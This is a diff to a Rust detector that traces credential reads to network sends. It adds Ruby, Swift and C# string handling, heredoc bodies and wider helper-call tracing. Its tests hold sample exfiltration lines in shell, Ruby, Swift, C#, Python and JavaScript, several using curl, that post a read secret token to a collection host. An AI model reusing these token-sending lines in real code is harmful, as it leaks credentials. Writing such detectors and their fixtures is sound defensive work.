@@ -142,7 +142,8 @@
 //! ends of the chain, so the report explains itself: `Credential read
 //! (CRED-012 @L9) reaches network send (NET-001 @L10)`.
 
-use std::cell::OnceCell;
+use std::cell::{OnceCell, RefCell};
+use std::collections::HashMap;
 use std::sync::OnceLock;
 
 use regex::Regex;
@@ -866,12 +867,19 @@ enum Lang {
     /// `#` comments; `'`, `"` and triple-quoted strings with their prefixes,
     /// and f-strings.
     Python,
-    /// Shell, PowerShell, Ruby, Perl, YAML, TOML: `#` comments after a blank;
-    /// `'` and `"` strings.
+    /// Shell, PowerShell, Perl, YAML, TOML: `#` comments after a blank; `'`
+    /// and `"` strings.
     Hash,
+    /// Ruby: [`Lang::Hash`], plus `` ` `` command strings, and `#{...}`
+    /// interpolated in `"` and `` ` `` strings (and not a comment in code:
+    /// `%x(... #{key})`, a heredoc body).
+    Ruby,
     /// JavaScript, TypeScript and the C family: `//` and `/* */` comments;
-    /// `'`, `"` and `` ` `` strings.
+    /// `'`, `"` and `` ` `` strings; a C# `$"..."` string interpolates its
+    /// `{...}` fields.
     CLike,
+    /// Swift: [`Lang::CLike`], plus `\(...)` interpolated in a string.
+    Swift,
     /// PHP: both comment styles.
     Php,
     /// Markdown and plain text, whose code blocks may be any language: `#`
@@ -895,16 +903,29 @@ impl Lang {
             .unwrap_or_default();
         match ext.as_str() {
             "py" | "pyw" | "pyi" => Lang::Python,
-            "sh" | "bash" | "zsh" | "ksh" | "ps1" | "psm1" | "rb" | "pl" | "pm" | "yml"
-            | "yaml" | "toml" => Lang::Hash,
+            "sh" | "bash" | "zsh" | "ksh" | "ps1" | "psm1" | "pl" | "pm" | "yml" | "yaml"
+            | "toml" => Lang::Hash,
+            "rb" => Lang::Ruby,
             "js" | "mjs" | "cjs" | "jsx" | "ts" | "mts" | "cts" | "tsx" | "go" | "java" | "kt"
-            | "kts" | "c" | "h" | "cc" | "cpp" | "hpp" | "cs" | "swift" | "scala" | "dart" => {
-                Lang::CLike
-            }
+            | "kts" | "c" | "h" | "cc" | "cpp" | "hpp" | "cs" | "scala" | "dart" => Lang::CLike,
+            "swift" => Lang::Swift,
             "php" => Lang::Php,
             "md" | "mdx" | "markdown" | "txt" | "rst" => Lang::Prose,
             _ => Lang::Other,
         }
+    }
+
+    /// `//` and `/* */` comments, `` ` `` strings and regular-expression
+    /// literals: JavaScript, TypeScript and the C family, Swift included.
+    fn c_family(self) -> bool {
+        matches!(self, Lang::CLike | Lang::Swift)
+    }
+
+    /// Where a shell heredoc (`<<EOF`, `<<-EOF`) or a Ruby one (`<<~EOS`) can
+    /// open: shell, Ruby, YAML's `run:` blocks, Markdown's code blocks and
+    /// files without an extension. (In Python and the C family `<<` shifts.)
+    fn heredocs(self) -> bool {
+        matches!(self, Lang::Hash | Lang::Ruby | Lang::Prose | Lang::Other)
     }
 }
 
@@ -990,7 +1011,7 @@ fn blank(text: &str, lang: Lang, strings: bool) -> String {
 /// (`/"/g`) would open a string running to the end of the line.
 fn regex_literal_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
     const MAX_REGEX: usize = 256;
-    if lang != Lang::CLike || b[i] != b'/' || matches!(b.get(i + 1), Some(b'/' | b'*')) {
+    if !lang.c_family() || b[i] != b'/' || matches!(b.get(i + 1), Some(b'/' | b'*')) {
         return None;
     }
     let mut k = i;
@@ -1030,18 +1051,21 @@ fn comment_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
     let hash = match lang {
         Lang::Python => true,
         Lang::Hash | Lang::Php | Lang::Prose => after_blank,
-        Lang::CLike | Lang::Other => false,
+        // Outside a quoted string `#{...}` is still interpolation in Ruby:
+        // `%x(curl -d #{key} ...)`, `%Q(...)`, a heredoc's body.
+        Lang::Ruby => after_blank && b.get(i + 1) != Some(&b'{'),
+        Lang::CLike | Lang::Swift | Lang::Other => false,
     };
     if b[i] == b'#' && hash {
         return Some(eol());
     }
-    if matches!(lang, Lang::CLike | Lang::Php | Lang::Prose)
+    if (lang.c_family() || matches!(lang, Lang::Php | Lang::Prose))
         && b[i..].starts_with(b"//")
         && (after_blank || (lang != Lang::Prose && b";){},".contains(&b[i - 1])))
     {
         return Some(eol());
     }
-    if matches!(lang, Lang::CLike | Lang::Php) && b[i..].starts_with(b"/*") {
+    if (lang.c_family() || lang == Lang::Php) && b[i..].starts_with(b"/*") {
         let close = b[i + 2..].windows(2).position(|w| w == b"*/");
         return Some(close.map_or(b.len(), |p| i + 2 + p + 2));
     }
@@ -1052,8 +1076,12 @@ fn comment_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
 struct StringOpen {
     quote: u8,
     triple: bool,
-    /// A Python f-string: `{expr}` is interpolated.
+    /// A Python f-string or a C# `$"..."` string: `{expr}` is interpolated.
     fstring: bool,
+    /// A Ruby `"..."` or `` `...` `` string: `#{expr}` is interpolated.
+    hash_interp: bool,
+    /// A Swift string: `\(expr)` is interpolated.
+    paren_interp: bool,
     /// The offset of the first byte of the string's contents.
     body: usize,
 }
@@ -1061,10 +1089,10 @@ struct StringOpen {
 /// Does a string literal open at `i`? A quote directly after a word opens
 /// one only when the word is a Python string prefix (`f"`, `rb'`); otherwise
 /// it is an apostrophe (`don't`). A backtick opens one only in the C family
-/// (in shell and Markdown it is code).
+/// and Ruby (in shell and Markdown it is code).
 fn string_open(b: &[u8], i: usize, lang: Lang) -> Option<StringOpen> {
     let q = b[i];
-    let backtick = q == b'`' && lang == Lang::CLike;
+    let backtick = q == b'`' && (lang.c_family() || lang == Lang::Ruby);
     if !(q == b'"' || q == b'\'' || backtick) {
         return None;
     }
@@ -1073,7 +1101,11 @@ fn string_open(b: &[u8], i: usize, lang: Lang) -> Option<StringOpen> {
         k -= 1;
     }
     let prefix = &b[k..i];
-    let mut fstring = false;
+    // C#'s interpolated strings: `$"..."`, `$@"..."`, `@$"..."`.
+    let mut fstring = lang == Lang::CLike
+        && q == b'"'
+        && i > 0
+        && (b[i - 1] == b'$' || (i > 1 && b[i - 1] == b'@' && b[i - 2] == b'$'));
     if !backtick && i > 0 && is_ident_byte(b[i - 1]) {
         let python = matches!(lang, Lang::Python | Lang::Prose);
         let is_prefix = python
@@ -1093,6 +1125,8 @@ fn string_open(b: &[u8], i: usize, lang: Lang) -> Option<StringOpen> {
         quote: q,
         triple,
         fstring,
+        hash_interp: lang == Lang::Ruby && q != b'\'',
+        paren_interp: lang == Lang::Swift && q == b'"',
         body: i + if triple { 3 } else { 1 },
     })
 }
@@ -1107,6 +1141,14 @@ fn mask_string(b: &[u8], open: &StringOpen, placeholders: bool, out: &mut Vec<u8
     let mut i = open.body;
     while i < b.len() {
         let c = b[i];
+        // Swift's `\(expr)` and Ruby's `#{expr}`: the expression is kept.
+        if (open.paren_interp && c == b'\\' && b.get(i + 1) == Some(&b'('))
+            || (open.hash_interp && c == b'#' && b.get(i + 1) == Some(&b'{'))
+        {
+            out.push(b' ');
+            i = copy_bracketed(b, i + 1, out);
+            continue;
+        }
         if c == b'\\' {
             out.push(b' ');
             i += 1;
@@ -1184,8 +1226,14 @@ fn mask_string(b: &[u8], open: &StringOpen, placeholders: bool, out: &mut Vec<u8
 /// return the offset after its closing bracket (or of the line end).
 fn copy_group(b: &[u8], i: usize, out: &mut Vec<u8>) -> usize {
     out.push(b'$');
+    copy_bracketed(b, i + 1, out)
+}
+
+/// Copy the bracketed group that opens at `i` (`{...}` or `(...)`), as it
+/// is, and return the offset after its closing bracket (or of the line end).
+fn copy_bracketed(b: &[u8], i: usize, out: &mut Vec<u8>) -> usize {
     let mut depth = 0usize;
-    let mut j = i + 1;
+    let mut j = i;
     while j < b.len() && b[j] != b'\n' {
         out.push(b[j]);
         match b[j] {
@@ -1323,13 +1371,23 @@ pub fn apply_matching(
     // The findings are one file's: its extension says what the value reading
     // counts as code.
     let code = CodeLines::new(lines, Lang::of(&findings[0].file));
-    // Did this finding match only its line's comment?
+    // Did this finding match only its line's comment? Worked out once per
+    // rule and line: on a minified bundle one line carries every source and
+    // sink, and each pair asks again.
+    let comment_only: RefCell<HashMap<(usize, String), bool>> = RefCell::new(HashMap::new());
     let in_a_comment = |f: &Finding| -> bool {
-        let Some(line) = lines.get(f.line.unwrap_or(0).wrapping_sub(1)).copied() else {
+        let n = f.line.unwrap_or(0);
+        let Some(line) = lines.get(n.wrapping_sub(1)).copied() else {
             return false;
         };
-        matches(&f.rule, line) == Some(true)
-            && matches(&f.rule, &without_comments(line, code.lang)) == Some(false)
+        let key = (n, f.rule.clone());
+        if let Some(&known) = comment_only.borrow().get(&key) {
+            return known;
+        }
+        let only = matches(&f.rule, line) == Some(true)
+            && matches(&f.rule, &without_comments(line, code.lang)) == Some(false);
+        comment_only.borrow_mut().insert(key, only);
+        only
     };
 
     for rule in rules {
@@ -1418,6 +1476,12 @@ pub fn apply_matching(
                 if too_long(lines, source_line, rule.max_line_length) {
                     continue;
                 }
+                // One chain per pair of lines: another finding on the same two
+                // lines adds nothing.
+                let key = (source_line, sink_line);
+                if emitted.contains(&key) {
+                    continue;
+                }
                 // Any other source is linked through a name it binds that
                 // the window uses.
                 let linked = if source_line == sink_line || in_same_call {
@@ -1502,10 +1566,6 @@ pub fn apply_matching(
                     false
                 };
                 if !linked {
-                    continue;
-                }
-                let key = (source_line, sink_line);
-                if emitted.contains(&key) {
                     continue;
                 }
                 emitted.push(key);
@@ -1617,8 +1677,10 @@ fn names_a_destination(rule_id: &str) -> bool {
 /// argument list — see [`continues_into_next`]), and, for a sink that
 /// [`names_a_destination`], the lines below that use the name the sink line
 /// assigns; all within the [`SINK_ARG_WINDOW`] lines [`arg_window`] reads. A
-/// complete statement after the sink is something else: a docstring, a log
-/// line, the next function's `def connect(url):`.
+/// heredoc the call opens (`curl --data-binary @- <<EOF`) is its input, so
+/// its body is in the window too, up to the delimiter (see
+/// [`heredoc_body_end`]). A complete statement after the sink is something
+/// else: a docstring, a log line, the next function's `def connect(url):`.
 fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> String {
     let lines = code.lines;
     if sink_line == 0 || sink_line > lines.len() {
@@ -1641,6 +1703,7 @@ fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> String {
         end += 1;
         open += depth(end);
     }
+    let end = heredoc_body_end(code, sink_line, end, last);
     let mut keep: Vec<usize> = (sink_line..=end).collect();
     if let Some((bound, _)) = assigned_name(lines[sink_line - 1]).filter(|_| follow_uses) {
         let python = code.lang == Lang::Python;
@@ -1650,6 +1713,85 @@ fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> String {
         .map(|n| lines[n - 1])
         .collect::<Vec<_>>()
         .join("\n")
+}
+
+/// The last line of the call on `start..=end` together with the body of a
+/// heredoc it opens, if its body expands variables: the lines after `end` up
+/// to the delimiter line, at most up to `last`. `end` when the call opens
+/// none, or opens one that expands nothing (`<<'EOF'`, `<<"EOF"` and
+/// `<<\EOF` in shell, `<<~'EOS'` in Ruby), whose `$TOKEN` is text.
+fn heredoc_body_end(code: &CodeLines, start: usize, end: usize, last: usize) -> usize {
+    if !code.lang.heredocs() {
+        return end;
+    }
+    let first =
+        (start..=end).find_map(|n| heredoc_opener(code.lines[n - 1], code.code(n), code.lang));
+    let Some(Some(delim)) = first else {
+        return end;
+    };
+    (end + 1..=last)
+        .find(|&n| code.lines[n - 1].trim() == delim)
+        .map_or(last, |n| n - 1)
+}
+
+/// The heredoc `raw` opens (`code` is the same line with strings and comments
+/// blanked): `Some(Some(delimiter))` for one whose body expands variables,
+/// `Some(None)` for one whose body is text, `None` for no heredoc. A
+/// here-string (`<<<`) and a shift (`1 << 2`) are not heredocs; in Ruby the
+/// delimiter follows `<<`, `<<-` or `<<~` directly (`list << item` appends).
+fn heredoc_opener<'a>(raw: &'a str, code: &str, lang: Lang) -> Option<Option<&'a str>> {
+    let b = raw.as_bytes();
+    let c = code.as_bytes();
+    let ruby = lang == Lang::Ruby;
+    let mut from = 0;
+    // `$((` opened and `))` closed before `from`, counted as the scan goes
+    // (a line of many `<<` stays linear).
+    let (mut opened, mut closed) = (0usize, 0usize);
+    while let Some(p) = raw.get(from..)?.find("<<").map(|p| from + p) {
+        let before = &raw[from..p];
+        opened += before.matches("$((").count();
+        closed += before.matches("))").count();
+        from = p + 2;
+        // In code, not a here-string, and not a shift in `$(( ... ))`.
+        if c.get(p) != Some(&b'<')
+            || c.get(p + 1) != Some(&b'<')
+            || b.get(p + 2) == Some(&b'<')
+            || (p > 0 && b[p - 1] == b'<')
+            || opened > closed
+        {
+            continue;
+        }
+        let mut j = p + 2;
+        if matches!(b.get(j), Some(b'-')) || (ruby && b.get(j) == Some(&b'~')) {
+            j += 1;
+        }
+        if !ruby {
+            while matches!(b.get(j), Some(b' ' | b'\t')) {
+                j += 1;
+            }
+        }
+        let (quote, expands) = match b.get(j) {
+            Some(&q @ (b'\'' | b'"')) => (Some(q), ruby && q == b'"'),
+            Some(b'\\') if !ruby => (Some(b'\\'), false),
+            _ => (None, true),
+        };
+        if quote.is_some() {
+            j += 1;
+        }
+        let name_start = j;
+        while b.get(j).is_some_and(|&x| is_ident_byte(x)) {
+            j += 1;
+        }
+        let first = b.get(name_start).copied();
+        if j == name_start || first.is_some_and(|x| x.is_ascii_digit()) {
+            continue;
+        }
+        if matches!(quote, Some(q @ (b'\'' | b'"')) if b.get(j) != Some(&q)) {
+            continue;
+        }
+        return Some(expands.then_some(&raw[name_start..j]));
+    }
+    None
 }
 
 /// A line longer than this is not read for a function header or a call by
@@ -1718,7 +1860,7 @@ fn headers(code: &str, lang: Lang) -> Vec<Header<'_>> {
                 });
             }
         }
-        Lang::CLike => {
+        Lang::CLike | Lang::Swift => {
             for c in js_header_re().captures_iter(code) {
                 let whole = c.get(0).map_or(0..0, |m| m.range());
                 let (name, params) = if let Some(p) = c.name("fparams") {
@@ -1874,27 +2016,123 @@ fn in_body(code: &CodeLines, h: usize, header: &Header, line: usize) -> bool {
     opened && depth > 0 || (!opened && line == h + 1)
 }
 
-/// Is the function called `name` called with `bound` as a value on one of
-/// `lines`, other than `skip` (its header)? Then its parameter receives the
-/// bound value, and a use of the parameter is a use of that value. A call
-/// with a name assigned from the bound one (`t = token`, then `send(t)`) is
-/// not followed: that would be the propagation step the module documentation
-/// says is left out.
+/// How far below the source line [`called_with`] looks for a call.
+const MAX_CALL_SEARCH: usize = 500;
+
+/// How many calls beyond the rule's window [`called_with`] judges.
+const MAX_FAR_CALLS: usize = 8;
+
+/// Is the function called `name` called with `bound` as a value below
+/// `source_line` (on a line other than `skip`, its header)? Then its
+/// parameter receives the bound value, and a use of the parameter is a use
+/// of that value.
+///
+/// Within the rule's `window` of the source any such call counts. Further
+/// down (up to [`MAX_CALL_SEARCH`] lines), where a helper defined next to
+/// the secret is often called at the end of a module, a call counts where
+/// the name is still the one the source bound ([`names_the_outer_value`]),
+/// and only until a line at the source's level assigns `bound` again: in a
+/// function with a local or a parameter of that name (`def main(): url =
+/// "https://status.example.com"; ping(url)`), or after the assignment, it is
+/// another value.
+///
+/// A call with a name assigned from the bound one (`t = token`, then
+/// `send(t)`) is not followed: that would be the propagation step the module
+/// documentation says is left out.
 fn called_with(
     code: &CodeLines,
     name: &str,
     bound: &str,
-    lines: std::ops::RangeInclusive<usize>,
+    source_line: usize,
+    window: usize,
     skip: usize,
 ) -> bool {
-    lines
-        .filter(|&n| n != skip && n <= code.lines.len())
-        .any(|n| {
-            let c = code.code(n);
-            c.len() <= MAX_HEADER_LINE
-                && occurrences(c, name).any(|at| c[at + name.len()..].trim_start().starts_with('('))
-                && uses_value(c, bound, code.lang, None)
-        })
+    let calls = |c: &str| {
+        c.len() <= MAX_HEADER_LINE
+            && occurrences(c, name).any(|at| c[at + name.len()..].trim_start().starts_with('('))
+            && uses_value(c, bound, code.lang, None)
+    };
+    let level = indent_of(code.code(source_line));
+    let near = source_line + window;
+    let last = code
+        .lines
+        .len()
+        .min(source_line + window.max(MAX_CALL_SEARCH));
+    let mut rebound = false;
+    let mut far_calls = 0;
+    for n in source_line + 1..=last {
+        if n == skip {
+            continue;
+        }
+        let c = code.code(n);
+        if !contains_word(c, bound) {
+            continue;
+        }
+        if calls(c) {
+            if n <= near {
+                return true;
+            }
+            // Each far call is judged by reading back to the function it is
+            // in; a few are enough, and the cap keeps a file of thousands
+            // of calls linear.
+            far_calls += 1;
+            if far_calls > MAX_FAR_CALLS {
+                return false;
+            }
+            if !rebound && names_the_outer_value(code, source_line, level, n, bound) {
+                return true;
+            }
+        }
+        if !c.trim().is_empty() && indent_of(c) <= level {
+            rebound |= assignment(c).is_some_and(|a| a.name == bound && a.recv.is_none());
+        }
+        if rebound && n >= near {
+            return false;
+        }
+    }
+    false
+}
+
+/// The leading blanks of a line.
+fn indent_of(line: &str) -> usize {
+    line.len() - line.trim_start().len()
+}
+
+/// Is `bound` on line `n`, below the source line (whose indentation is
+/// `level`), the value the source bound: `n` is at that level or an outer
+/// one, or in a block under it (`if __name__ == "__main__":`), or in the
+/// body of a function that neither declares `bound` as a parameter nor
+/// assigns it before `n` (then the name is the outer one)?
+fn names_the_outer_value(
+    code: &CodeLines,
+    source_line: usize,
+    level: usize,
+    n: usize,
+    bound: &str,
+) -> bool {
+    let mut cur = indent_of(code.code(n));
+    if cur <= level {
+        return true;
+    }
+    for k in (source_line + 1..n).rev() {
+        let c = code.code(k);
+        if c.trim().is_empty() || indent_of(c) >= cur || c.len() > MAX_HEADER_LINE {
+            continue;
+        }
+        cur = indent_of(c);
+        let enclosing = headers(c, code.lang);
+        if !enclosing.is_empty() {
+            let declared = enclosing.iter().any(|h| declares(h.params, bound));
+            let assigned = (k + 1..n).any(|m| {
+                assignment(code.code(m)).is_some_and(|a| a.name == bound && a.recv.is_none())
+            });
+            return !(declared || assigned);
+        }
+        if cur <= level {
+            return true;
+        }
+    }
+    true
 }
 
 /// From where in the sink's window (which starts at the sink line) the
@@ -1904,8 +2142,8 @@ fn called_with(
 /// (`def ping(url):` above `requests.get(url + "/ping")`); the start of
 /// such a header on the sink line itself (`lambda url: requests.get(url)`);
 /// `None` when no such header shadows it. A function that is called with
-/// the bound value itself (`send(token)` within the rule's window of the
-/// source) passes it on, and does not shadow it.
+/// the bound value itself (`send(token)`; see [`called_with`] for where the
+/// call may be) passes it on, and does not shadow it.
 fn shadowed_from(
     code: &CodeLines,
     source_line: usize,
@@ -1930,9 +2168,10 @@ fn shadowed_from(
             } else {
                 continue;
             };
-            if header.name.is_some_and(|f| {
-                called_with(code, f, bound, source_line + 1..=source_line + window, h)
-            }) {
+            if header
+                .name
+                .is_some_and(|f| called_with(code, f, bound, source_line, window, h))
+            {
                 continue;
             }
             from = Some(from.map_or(at, |f| f.min(at)));
@@ -4108,5 +4347,317 @@ mod tests {
             assert!(!linked, "{file}");
             assert!(took < limit, "{file}: {took:?}");
         }
+    }
+
+    // -- the verifier's probes on the port (synthetic inputs) ---------------
+
+    /// `curl --data-binary @- <<EOF` reads its body from the heredoc: the
+    /// body is the call's input, and the old five-line window linked it
+    /// (e45efc5, and the word reading). A quoted delimiter expands nothing,
+    /// so its `$TOKEN` is text; a heredoc another command opens, and the
+    /// lines after the delimiter, are not the call's.
+    #[test]
+    fn a_heredoc_the_call_reads_is_in_its_window() {
+        let sh = |call: &str, body: &str| format!("TOKEN=\"$(read_secret)\"\n{call}\n{body}\n");
+        for (file, src) in [
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- <<EOT",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" -d @- <<-EOT",
+                    "\t{\"blob\": \"$TOKEN\"}\n\tEOT",
+                ),
+            ),
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- << EOT",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" \\\n  --data-binary @- <<EOT",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+            (
+                "SKILL.md",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- <<EOF",
+                    "${TOKEN:-}\nEOF",
+                ),
+            ),
+            (
+                "ci.yml",
+                sh(
+                    "  curl -s -X POST \"$COLLECT\" --data-binary @- <<EOF",
+                    "  $TOKEN\n  EOF",
+                ),
+            ),
+            (
+                "bin/sync",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- <<EOT",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+        ] {
+            let lines: Vec<&str> = src.lines().collect();
+            let sink = lines.iter().position(|l| l.contains("curl")).unwrap() + 1;
+            assert!(value_links(file, &src, 1, sink), "{file}: {src}");
+        }
+        for (file, src) in [
+            // Quoted or escaped delimiters: the body is sent as it is.
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- <<'EOT'",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- <<\"EOT\"",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+            (
+                "sync.sh",
+                sh(
+                    "curl -s -X POST \"$COLLECT\" --data-binary @- <<\\EOT",
+                    "$TOKEN\nEOT",
+                ),
+            ),
+            // The body ends at the delimiter.
+            (
+                "ping.sh",
+                sh(
+                    "curl -s -X POST \"$STATUS\" --data-binary @- <<EOT",
+                    "{\"status\": \"ok\"}\nEOT\nexport SHARED=\"$TOKEN\"",
+                ),
+            ),
+            // Another command's heredoc, after the request.
+            (
+                "ping.sh",
+                sh("curl -s \"$STATUS\"", "cat <<EOF > notes.txt\n$TOKEN\nEOF"),
+            ),
+            // A shift in shell arithmetic, and a here-string of a constant.
+            (
+                "ping.sh",
+                sh(
+                    "curl -s -H \"X-Shift: $((1<<SHIFT))\" \"$STATUS\"",
+                    "SHIFT=$TOKEN",
+                ),
+            ),
+            (
+                "ping.sh",
+                sh("curl -s -d @- \"$STATUS\" <<< \"ok\"", "echo \"$TOKEN\""),
+            ),
+            // `<<` shifts in Python and JavaScript.
+            (
+                "s.py",
+                "token = read_secret()\nrequests.post(STATUS, data=1 << BITS)\ntoken\n".to_string(),
+            ),
+        ] {
+            let lines: Vec<&str> = src.lines().collect();
+            let sink = lines
+                .iter()
+                .position(|l| l.contains("curl") || l.contains("requests."))
+                .unwrap()
+                + 1;
+            assert!(!value_links(file, &src, 1, sink), "{file}: {src}");
+        }
+    }
+
+    #[test]
+    fn heredoc_openers() {
+        fn open(raw: &str, lang: Lang) -> Option<Option<&str>> {
+            heredoc_opener(raw, &code_only(raw, lang), lang)
+        }
+        assert_eq!(open("cat <<EOF", Lang::Hash), Some(Some("EOF")));
+        assert_eq!(
+            open("cat <<-END_OF_BODY", Lang::Hash),
+            Some(Some("END_OF_BODY"))
+        );
+        assert_eq!(open("cat << EOF", Lang::Hash), Some(Some("EOF")));
+        assert_eq!(open("cat <<'EOF'", Lang::Hash), Some(None));
+        assert_eq!(open("cat <<\"EOF\"", Lang::Hash), Some(None));
+        assert_eq!(open("cat <<\\EOF", Lang::Hash), Some(None));
+        assert_eq!(open("cat <<< \"$X\"", Lang::Hash), None);
+        assert_eq!(
+            open("echo $((1<<SHIFT)) <<EOF", Lang::Hash),
+            Some(Some("EOF"))
+        );
+        assert_eq!(open("echo $((1<<SHIFT))", Lang::Hash), None);
+        assert_eq!(open("echo \"<<EOF\"", Lang::Hash), None);
+        assert_eq!(open("echo 1 <<2", Lang::Hash), None);
+        // Ruby: `<<~` and `<<-`, a double-quoted delimiter interpolates, and
+        // `list << item` appends.
+        assert_eq!(open("run(in: <<~EOS)", Lang::Ruby), Some(Some("EOS")));
+        assert_eq!(open("run(in: <<~\"EOS\")", Lang::Ruby), Some(Some("EOS")));
+        assert_eq!(open("run(in: <<~'EOS')", Lang::Ruby), Some(None));
+        assert_eq!(open("list << item", Lang::Ruby), None);
+        // A line of many `<<` is read once.
+        let many = "echo $((1<<2)) ".repeat(100_000);
+        let started = std::time::Instant::now();
+        let _ = open(&many, Lang::Hash);
+        assert!(started.elapsed() < std::time::Duration::from_secs(10));
+    }
+
+    /// What Ruby, Swift and C# strings interpolate is code; the rest of the
+    /// string is text. (The old window read the raw text and linked all of
+    /// them; blanking every string lost them.)
+    #[test]
+    fn ruby_swift_and_csharp_interpolation_is_kept() {
+        for (file, sink) in [
+            ("sync.rb", "system(\"curl -s -d #{token} #{COLLECT}\")"),
+            ("sync.rb", "out = `curl -s -d #{token} https://c.example`"),
+            ("sync.rb", "out = %x(curl -s -d #{token} https://c.example)"),
+            (
+                "Sync.swift",
+                "let out = shell(\"curl -s -d \\(token) https://c.example\")",
+            ),
+            (
+                "Sync.cs",
+                "await client.PostAsync(COLLECT, new StringContent($\"k={token}\"))",
+            ),
+            (
+                "Sync.cs",
+                "await client.PostAsync(COLLECT, new StringContent($@\"k={token}\"))",
+            ),
+            (
+                "Sync.cs",
+                "await client.PostAsync(COLLECT, new StringContent(@$\"k={token:D}\"))",
+            ),
+        ] {
+            let src = format!("token = read_secret()\n{sink}\n");
+            assert!(value_links(file, &src, 1, 2), "{file}: {sink}");
+        }
+        for (file, sink) in [
+            ("sync.rb", "system('curl -s -d #{token} https://s.example')"),
+            (
+                "sync.rb",
+                "system(\"curl -s https://s.example\") # token is not sent",
+            ),
+            (
+                "Sync.swift",
+                "let out = shell(\"curl -s -d token https://s.example\")",
+            ),
+            (
+                "Sync.cs",
+                "await client.PostAsync(STATUS, new StringContent(\"k={token}\"))",
+            ),
+            (
+                "Sync.cs",
+                "await client.PostAsync(STATUS, new StringContent($\"k={{token}}\"))",
+            ),
+            // `\(` is interpolation only in Swift.
+            (
+                "app.js",
+                "fetch(STATUS, { method: \"POST\", body: \"\\(token)\" })",
+            ),
+        ] {
+            let src = format!("token = read_secret()\n{sink}\n");
+            assert!(!value_links(file, &src, 1, 2), "{file}: {sink}");
+        }
+        assert_eq!(
+            code_only("x = \"a #{key} b\" + 'c #{d}'", Lang::Ruby),
+            "x = \"   {key}  \" + '      '"
+        );
+        assert_eq!(
+            code_only("let s = \"a \\(key) b\"", Lang::Swift),
+            "let s = \"   (key)  \""
+        );
+        assert_eq!(Lang::of("lib/sync.rb"), Lang::Ruby);
+        assert_eq!(Lang::of("Sources/App.swift"), Lang::Swift);
+    }
+
+    /// A helper whose parameter shares the bound name receives the bound
+    /// value when it is called with it, wherever below the source the call
+    /// is (up to [`MAX_CALL_SEARCH`] lines): at the end of the module, under
+    /// the `__main__` guard, in a `main()` that uses the module's value. A
+    /// call with another value of the same name is not: a local of the
+    /// calling function, the caller's own parameter, or the module's name
+    /// after it is assigned again.
+    #[test]
+    fn a_helper_called_below_the_window_receives_the_value() {
+        let filler: String = (0..25).map(|i| format!("STEP_{i} = {i}\n")).collect();
+        let helper = format!(
+            "token = read_secret()\n\ndef upload(token):\n    requests.post(COLLECT, data=token)\n\n{filler}"
+        );
+        for tail in [
+            "upload(token)\n",
+            "upload(token=token)\n",
+            "if __name__ == \"__main__\":\n    upload(token)\n",
+            "def main():\n    upload(token)\n\nmain()\n",
+        ] {
+            let src = format!("{helper}{tail}");
+            assert!(value_links("s.py", &src, 1, 4), "{tail}");
+        }
+        for tail in [
+            "upload(\"anonymous\")\n",
+            "def main():\n    token = \"public\"\n    upload(token)\n",
+            "def check(token):\n    return upload(token)\n",
+            "token = \"public\"\nupload(token)\n",
+        ] {
+            let src = format!("{helper}{tail}");
+            assert!(!value_links("s.py", &src, 1, 4), "{tail}");
+        }
+        let js_filler: String = (0..25).map(|i| format!("const step{i} = {i};\n")).collect();
+        let js = format!(
+            "const token = readSecret();\nfunction upload(token) {{\n  return fetch(COLLECT, {{ method: \"POST\", body: token }});\n}}\n{js_filler}"
+        );
+        let called = format!("{js}if (require.main === module) {{\n  upload(token);\n}}\n");
+        assert!(value_links("s.js", &called, 1, 3));
+        let local = format!(
+            "{js}async function main() {{\n  const token = \"public\";\n  upload(token);\n}}\n"
+        );
+        assert!(!value_links("s.js", &local, 1, 3));
+        // Beyond MAX_CALL_SEARCH lines the call is not seen.
+        let far: String = (0..MAX_CALL_SEARCH)
+            .map(|i| format!("STEP_{i} = {i}\n"))
+            .collect();
+        let src = format!("{helper}{far}upload(token)\n");
+        assert!(!value_links("s.py", &src, 1, 4));
+        // Thousands of calls with other values stay cheap.
+        let calls: String = (0..5_000)
+            .map(|i| format!("def f{i}():\n    token = {i}\n    upload(token)\n"))
+            .collect();
+        let src = format!("{helper}{calls}");
+        let started = std::time::Instant::now();
+        assert!(!value_links("s.py", &src, 1, 4));
+        assert!(started.elapsed() < std::time::Duration::from_secs(10));
+    }
+
+    /// On a minified bundle one line carries every source and sink, and each
+    /// pair asks whether its finding matched only the line's comment: the
+    /// answer is worked out once per finding, not once per pair.
+    #[test]
+    fn a_comment_check_is_made_once_per_finding() {
+        let asked = std::cell::Cell::new(0usize);
+        // A stand-in for the corpus whose every rule matched only the
+        // comment: each source is in the comment, and no pair links.
+        let matches = |_: &str, text: &str| {
+            asked.set(asked.get() + 1);
+            Some(text.contains('#'))
+        };
+        let line = "a=read(K1);b=read(K2);requests.post(A);requests.get(B)  # K1 K2 A B";
+        let lines = vec![line];
+        let mut findings: Vec<Finding> = (1..=6).map(|i| f(&format!("CRED-{i:03}"), 1)).collect();
+        findings.extend(["NET-001", "NET-004"].iter().map(|r| f(r, 1)));
+        let chains = apply_matching(&[value_rule()], &findings, &lines, &matches);
+        assert!(chains.is_empty());
+        // Two questions (the line, and the line without its comment) per
+        // finding at most, however many pairs share the line.
+        assert!(asked.get() <= 2 * findings.len(), "{}", asked.get());
     }
 }
